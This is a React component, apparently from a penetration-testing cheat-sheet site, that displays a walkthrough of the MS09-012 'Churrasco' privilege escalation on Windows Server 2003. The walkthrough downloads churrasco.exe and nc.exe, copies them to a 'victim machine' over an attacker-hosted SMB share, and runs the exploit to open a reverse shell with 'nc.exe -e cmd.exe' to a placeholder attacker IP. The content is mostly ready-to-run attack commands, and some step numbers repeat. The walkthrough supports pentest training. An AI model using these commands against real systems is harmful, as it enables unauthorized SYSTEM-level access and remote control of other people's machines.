import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const MS09_012_Churrasco = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>Windows Server 2003 Vulnerability.</Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Get churrasco.exe</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Get nc.exe</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget https://github.com/int0x33/nc.exe/raw/master/nc.exe"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Transfer churrasco.exe and nc.exe to victim machine
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"smbserver.py kali ."}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"copy \\\\{attackerIP}\\kali\\{file} ."}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Start nc listener on attacker machine</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"nc -lvnp 5555"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Run the exploit and get a callback to attacker machine
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                '.\\churrasco.exe "C:\\Tools\\nc.exe -e cmd.exe {ATTACKER_IP} 5555"'
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default MS09_012_Churrasco;
